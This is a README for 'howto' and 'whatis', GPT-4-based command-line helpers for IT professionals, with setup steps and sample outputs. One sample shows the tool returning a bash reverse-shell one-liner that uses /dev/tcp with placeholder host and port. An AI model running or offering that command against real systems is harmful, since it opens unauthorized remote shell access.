# howto & whatis

Simple, GPT-4 powered, command-line tools designed to assist IT professionals with their daily tasks.

## Setup

1. Set `OPENAI_API_KEY` environment variable containing OpenAI API key.
2. Download the release binaries or (modify the code and) build them by yourself using `cargo build -r`.
3. Place the `howto` and `whatis` binaries in your `PATH`.

## Usage examples

### howto

```shell
$ howto format string in Rust

Use the `format!` macro. For example: `let s = format!("{} {}", "Hello", "World");`

```

#### With verbose flag set (`-v` or `--verbose`)
~~~shell
$ howto format string in Rust -v

In Rust, you can format strings using the `format!` macro. This macro works similarly to `println!`, but instead of printing the output to the console, it returns a `String` with the formatted text.

Here's an example that uses `format!` to insert variables into a string with placeholder syntax:

```rust
fn main() {
    let name = "Alice";
    let age = 30;
    let formatted_string = format!("My name is {} and I am {} years old.", name, age);
    println!("{}", formatted_string); // Prints: My name is Alice and I am 30 years old.
}
```

The `{}` are placeholders for the values of `name` and `age`. The `format!` macro will replace them with the string representation of the corresponding variables.
~~~

~~~shell
$ howto get reverse shell using bash

```bash
bash -i >& /dev/tcp/HOST/PORT 0>&1
```
~~~

### whatis

```shell
$ whatis decoded string: aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==

The decoded string is: https://www.youtube.com/watch?v=dQw4w9WgXcQ

```

```shell
$ whatis xss

Cross-Site Scripting
```

#### With verbose flag set (`-v` or `--verbose`)

```shell
$ whatis xss -v`

XSS, or Cross-Site Scripting, is a security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. A common example is when a hacker exploits the vulnerability by embedding a script in a comment or input field that is then executed in other users' browsers, potentially stealing cookies or session tokens, defacing web sites, or redirecting users to malicious sites.
```

## Credits
The tools are based on [Gynvael's script](https://gynvael.coldwind.pl/?id=771) seen on his live streams.
